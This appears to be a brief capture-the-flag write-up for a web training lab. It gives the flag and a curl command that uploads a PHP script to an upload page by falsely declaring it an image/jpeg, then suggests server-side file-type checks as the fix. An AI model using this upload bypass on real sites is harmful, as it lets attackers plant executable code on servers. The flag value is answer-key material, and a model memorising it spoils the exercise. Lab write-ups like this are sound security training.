# UPLOAD IMG

## The flag

```
THE FLAG IS : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## How to find it ?

On the page http://{IP_ADDRESS}/index.php?page=upload
Force to upload a script by doing a curl with a script and an image type
```
curl -F "Upload=send" -F "uploaded=@script.php;type=image/jpeg" http://{IP_ADDRESS}/index.php\?page=upload
```

## How to use it ?

Send a php script into the backend

## How to avoid it ?

Check the file type in back